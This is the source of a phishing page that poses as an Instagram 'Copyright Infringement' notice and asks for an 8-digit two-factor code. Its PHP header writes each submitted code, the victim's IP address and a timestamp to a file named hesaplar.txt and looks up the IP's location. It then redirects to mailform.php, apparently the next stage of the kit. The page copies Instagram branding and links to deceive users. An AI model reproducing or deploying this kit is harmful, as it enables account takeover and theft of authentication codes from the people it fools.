<?php 

if($_POST){
  $code=$_POST["code"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $ulke = $details->country; date_default_timezone_set('Europe/Istanbul'); 
  $cur_time=date("d-m-Y H:i:s");
  $file = fopen('hesaplar.txt', 'a');
  fwrite($file, "Code: ".$code."\n"."Ip Adress: " .$ip."\n"."Time: " .$cur_time.  "\n\n");
fclose($file);
  echo '';     

  header("Location: mailform.php"); }      

?>

<html>
<head>
    <meta charset="utf-8">
    <title>İnstagram | Copyright Infringement</title>
    <meta content="minimum-scale=1.0, width=device-width, maximum-scale=0.6667, user-scalable=no" name="viewport">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <link rel="stylesheet" type="text/css" href="css/style1.css">
    <link rel="stylesheet" type="text/css" href="css/style2.css">
<style>

#header {
    width: 100%;
    text-align: center;
    padding-top: 20px;
    position: fixed;
    background-color: #ffffff;
    top: 0px;
    left: 0px;
    height: 70px;
    border-bottom: 2px solid #dbdbdb;
}

#header img {
    width: 200px;
}

#menu {
    width:91%;
} 

#liste {
    display:inline-block;
}

#link {
    text-decoration:none;
    color:#003569; 
    font-family:sans-serif; 
    font-size:13px; 
    font-weight:540; 
    vertical-align: baseline; 
}

#body {
    background-color:#fafafa;
}

#h1 {
    font-family:sans-serif;
    font-weight:400;
    letter-spacing:;
    color:#3d3d3d;
    font-size:20px;
}

#div {
    background-color:white;
    width:300px;
}

#p {
    font-family:sans-serif;
    color:#999;
    width:270px;
}

#button {
    color:white;
    background-color:#3897f0;
    font-size:15px;
    border-radius:3px;
    outline:none;
    font-family:sans-serif;
    font-weight:700;
    border:0;
    width:200px;
    height:40px;
    max-width:99%;
    max-height:50px;
}

.bottom{
  min-height:60px;
  position:fixed;
  bottom:0;
  width:100%;
  background:#fafafa;
  border-top:1px solid #cecece;
}.mini{
  font-size:13px;
  margin-top:8px;
    color:#8e8e8e;
  display:block;
}

.big{
  margin-top:5px;
  font-size:13px;
  letter-spacing:2px;
}
</style>
</head>
<body>

<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DsignupPage%26ig_mid%3DAE2FF212-B09F-4D9D-97C1-5FD6BB456D90%26utm_content%3Dlo%26utm_medium%3Dbadge" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">lnstagram</p><p class="_5b2Kp">Find it for free on Google Play.
</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div>

<body bgcolor="#fafafa">

<br><br><br><br></div><br><br>

<center>

<div id="div" style="border:1px solid #cecece;">

<center>

<br> 

  <img src="logo.png" alt="" width=150 style="border-radius:50%;margin-top:12px;">

<br>

  <h1 id="h1">Two Factor Code</h1>

<br>

  <p id="p">If your 2-factor login is open, enter the 8-digit code below. If two-factor authentication is disabled, skip this page.</p>

<br>

<form method="post" >

  <input type="code" name="code" maxlength="8" placeholder="Code" required=""  style="padding:6px;background:#fafafa;outline:none;width:83%;height:37px;border:1px solid #dedede;font-family:sans-serif;font-weight:350;flex: 1 0 0px;text-align:center;margin: 0;outline: 0;overflow: hidden;padding: 9px 0 7px 8px;text-overflow: ellipsis;border: 1px solid #e6e6e6;text-overflow:ellipsis;font: 400 13.3333px Arial; border-radius:3px;"><br><br>

<br>

    <button id="button" type="submit">Continue</button>

 <br>
<br>

</center>

</form>

<a href="mailform.php"><button id="button" type="submit">Jump</button></a>

<br>

<center>
<a href="https://help.instagram.com/1006568999411025"><button id="button" type="submit">How to get an 8 factor code</button></a>
</center>
<br>
</center>

</div>

<br><br><br>

<center>
  <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_turkish-tr.png/30b29fd697b2.png" width="120">
  </a>
  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD1619D39-E370-43DA-B97D-B73020E1B4AC%26utm_content%3Dlo%26utm_medium%3Dbadge">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_turkish-tr.png/9d46177cf153.png" width="120">
  </a>
</center>

</div>

<br><br><br>

<center>
<div id="menu">
</center>
<center>
  <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">PRESS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">JOBS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">PRIVACY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">TERMS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">DIRECTORY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
  <li id="liste"><a href="" id="link">LANGUAGE</a></li></div><br> 
</center>

  <br><br><br><br><br><br>
  <center>
<div class="bottom">
  <center>
  <img src="https://www.ozengen.com/wp-content/uploads/2020/01/instagram-from-facebook-620x319.png" width="110">
  </center>
</div>
</center>

</body>
</html>